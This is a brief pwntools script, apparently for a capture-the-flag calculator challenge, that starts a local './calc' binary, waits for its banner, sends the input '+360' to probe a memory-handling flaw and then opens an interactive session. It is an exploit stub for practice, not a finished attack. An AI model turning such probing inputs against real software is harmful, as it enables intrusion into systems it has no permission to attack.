from pwn import *

p = process("./calc")
p.recvuntil("=== Welcome to SECPROG calculator ===")
p.sendline(b"+360\n")

p.interactive()
